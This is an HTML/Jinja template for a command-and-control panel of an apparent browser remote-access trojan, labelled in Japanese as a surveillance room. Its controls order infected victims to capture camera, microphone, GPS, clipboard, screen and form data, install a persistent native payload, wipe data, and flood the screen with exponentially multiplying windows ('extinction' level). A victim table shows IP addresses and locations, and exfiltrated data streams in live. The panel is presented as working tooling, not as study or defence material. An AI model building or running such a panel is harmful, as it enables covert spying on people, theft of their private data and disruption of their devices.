<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>監視室 {{ code }}</title>
<style>
  :root{--bg:#05070a;--fg:#cfe9dd;--dim:#6f8a80;--line:#16261f;--acc:#00ff88;--red:#ff5c8a;--blue:#4c8dff;--yel:#ffd166}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}
  a{color:var(--acc);text-decoration:none}
  header{display:flex;gap:10px;align-items:center;flex-wrap:wrap;padding:10px 14px;border-bottom:1px solid var(--line);position:sticky;top:0;background:rgba(5,7,10,.96);z-index:5}
  .badge{border:1px solid var(--line);border-radius:999px;padding:2px 9px;font-size:11px;color:var(--dim)}
  .grow{flex:1}
  main{padding:14px;display:grid;gap:14px;max-width:1180px;margin:0 auto}
  section{border:1px solid var(--line);border-radius:10px;padding:12px 14px;background:#070b0e}
  h2{margin:0 0 8px;font-size:12px;letter-spacing:.08em;color:var(--dim);text-transform:uppercase}
  button{font:12px ui-monospace,monospace;background:#0b1216;color:var(--fg);border:1px solid var(--line);border-radius:7px;padding:5px 10px;cursor:pointer}
  button:hover{border-color:var(--acc);color:#fff}
  button.on{background:#062017;border-color:var(--acc);color:var(--acc)}
  button.danger{border-color:#5c1730;color:var(--red)}
  button.danger:hover{background:#2a0b17;color:#fff}
  input,select{font:12px ui-monospace,monospace;background:#0b1216;color:var(--fg);border:1px solid var(--line);border-radius:7px;padding:5px 8px}
  .lv{display:flex;gap:6px;flex-wrap:wrap}
  .lv button{min-width:44px}
  .lv button[data-fixed]{border-color:var(--yel)}
  table{width:100%;border-collapse:collapse;font-size:12px}
  td,th{border-bottom:1px solid var(--line);padding:4px 6px;text-align:left;vertical-align:top}
  th{color:var(--dim);font-weight:400}
  .k{color:var(--dim);white-space:nowrap}
  .v{word-break:break-all;color:#dff7ec}
  .live{max-height:420px;overflow:auto}
  .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
  .muted{color:var(--dim)}
  .pill{border:1px solid var(--line);border-radius:999px;padding:1px 8px;font-size:11px}
  img.shot{max-width:220px;border:1px solid var(--line);border-radius:8px}
</style>
</head>
<body>
<header>
  <b style="color:var(--acc)">◉ SINGULARITY</b>
  <span class="badge">code {{ code }}</span>
  <span class="badge" id="w-lv">L{{ level }} {{ level_label }}</span>
  <span class="badge" id="w-fixed" {% if row.fixed %}style="border-color:var(--yel);color:var(--yel)"{% endif %}>
    {% if row.fixed %}固定枠{% else %}可変{% endif %}
  </span>
  <span class="grow"></span>
  <span class="muted" id="w-clock">--:--:--</span>
  <a href="/vp">一覧</a>
</header>

<main>
  <section>
    <h2>レベル（遠隔・0〜7 / L7は絶滅）</h2>
    <div class="lv" id="w-lvbtns">
      {% for k, v in LEVEL_LABEL.items() %}
        <button data-lv="{{ k }}" class="{% if k == level %}on{% endif %}">L{{ k }} {{ v }}</button>
      {% endfor %}
      <span style="width:14px"></span>
      <button id="w-fixbtn" class="{% if row.fixed %}on{% endif %}">🔒 固定枠{% if row.fixed %} 解除{% else %} にする{% endif %}</button>
      <button id="w-winbtn" class="danger">🌐 窓を繁殖</button>
    </div>
    <div class="row" style="margin-top:8px">
      <label class="muted">窓の枝数</label>
      <input id="w-branch" type="number" min="1" max="8" value="2" style="width:64px">
      <span class="muted">※ L7は winDepth=0（リミッターなし）で倍々に増殖</span>
    </div>
    <div class="muted" id="w-desc" style="margin-top:8px"></div>
  </section>

  <section>
    <h2>遠隔操作（RAT / コマンド）</h2>
    <div class="row">
      <input id="w-arg" placeholder="引数（URL / 文言 / 番号）" style="min-width:260px">
      <select id="w-sid"><option value="">全個体</option></select>
    </div>
    <div class="row" style="margin-top:8px">
      <button data-cmd="shot">📷 撮影</button>
      <button data-cmd="mic">🎙 マイク</button>
      <button data-cmd="geo">📍 GPS</button>
      <button data-cmd="clip">📋 クリップボード</button>
      <button data-cmd="screen">🖥 画面</button>
      <button data-cmd="dom">🧾 フォーム</button>
      <button data-cmd="speak">🔊 発話</button>
      <button data-cmd="open">🌐 開く</button>
      <button data-cmd="nav">➡ 遷移</button>
      <button data-cmd="notify">🔔 通知</button>
      <button data-cmd="badge">🔢 バッジ</button>
      <button data-cmd="title">🏷 タイトル</button>
      <button data-cmd="pip">🪟 PiP</button>
      <button data-cmd="fullscreen">⛶ 全画面</button>
      <button data-cmd="freeze">❄ 凍結</button>
      <button data-cmd="reload">↻ 再読込</button>
      <button data-cmd="update">⬆ 更新</button>
      <button data-cmd="native" class="danger">⬇ 常駐インストーラ</button>
      <button data-cmd="winskin" class="danger">✨ 窓スキン</button>
      <button data-cmd="win" class="danger">🌐 窓を繁殖</button>
      <button data-cmd="wipe" class="danger">🧹 消去</button>
      <button data-cmd="install">📲 インストール要求</button>
    </div>
  </section>

  <section>
    <h2>個体（ヒット）</h2>
    <table id="w-hits"><thead><tr><th>id</th><th>時刻</th><th>端末</th><th>IP</th><th>GPS</th></tr></thead><tbody></tbody></table>
  </section>

  <section>
    <h2>ライブデータ（報告の差分）</h2>
    <div class="live"><table id="w-data"><thead><tr><th>key</th><th>value</th><th>時刻</th></tr></thead><tbody></tbody></table></div>
  </section>
</main>

<script>
const CODE = {{ code|tojson }};
const $ = (s) => document.querySelector(s);
let LEVEL = {{ level }};

function post(url, body) {
  return fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" },
                      body: new URLSearchParams(body || {}) });
}

/* レベル */
document.querySelectorAll("#w-lvbtns button[data-lv]").forEach(b => {
  b.onclick = async () => {
    await post("/vp/" + CODE + "/level", { level: b.dataset.lv });
    location.reload();
  };
});
$("#w-fixbtn").onclick = async () => { await post("/vp/" + CODE + "/fix", { fixed: "{{ 1 if row.fixed else 0 }}" === "1" ? "0" : "1" }); location.reload(); };

/* コマンド */
document.querySelectorAll("button[data-cmd]").forEach(b => {
  b.onclick = async () => {
    const k = b.dataset.cmd;
    const a = ["speak", "open", "nav", "native", "win", "freeze", "title", "badge", "notify"].includes(k) ? $("#w-arg").value : "";
    await post("/vp/" + CODE + "/cmd", { kind: k, arg: a, sid: $("#w-sid").value });
    b.classList.add("on");
    setTimeout(() => b.classList.remove("on"), 700);
  };
});
$("#w-winbtn").onclick = async () => {
  await post("/vp/" + CODE + "/win", { n: $("#w-branch").value || "2" });
};

/* ライブ更新 */
async function tick() {
  try {
    const r = await fetch("/vp/" + CODE + "/data", { cache: "no-store" });
    const j = await r.json();
    const tb = $("#w-data tbody"); tb.innerHTML = "";
    (j.data || []).slice(0, 300).forEach(d => {
      const tr = document.createElement("tr");
      tr.innerHTML = '<td class="k"></td><td class="v"></td><td class="k"></td>';
      tr.children[0].textContent = d.key;
      let v = d.value;
      if (d.key === "media.snapshot" || /^rat\.(shot|screen)$/.test(d.key)) {
        tr.children[1].innerHTML = '<img class="shot" src="' + v + '">';
      } else { tr.children[1].textContent = v; }
      tr.children[2].textContent = (d.ts || "").slice(11, 19);
      tb.appendChild(tr);
    });
    const hb = $("#w-hits tbody"); hb.innerHTML = "";
    (j.hits || []).forEach(h => {
      const tr = document.createElement("tr");
      tr.innerHTML = "<td></td><td></td><td></td><td></td><td></td>";
      tr.children[0].textContent = h.id;
      tr.children[1].textContent = (h.ts || "").slice(11, 19);
      tr.children[2].textContent = (h.device || "") + " / " + (h.browser || "");
      tr.children[3].textContent = h.ip || "";
      tr.children[4].textContent = (h.gps_lat ? h.gps_lat.toFixed(3) + "," + h.gps_lon.toFixed(3) : "");
      hb.appendChild(tr);
    });
    const sel = $("#w-sid"), cur = sel.value;
    const vids = [...new Set((j.hits || []).map(h => h.vid).filter(Boolean))];
    sel.innerHTML = '<option value="">全個体</option>' + vids.map(v => '<option>' + v + '</option>').join("");
    sel.value = cur;
  } catch (e) {}
  $("#w-clock").textContent = new Date().toLocaleTimeString();
}
tick(); setInterval(tick, 3000);

const DESCS = {{ level_desc|tojson }};
function paintDesc() { $("#w-desc").textContent = DESCS[LEVEL] || ""; }
paintDesc();
</script>
</body>
</html>
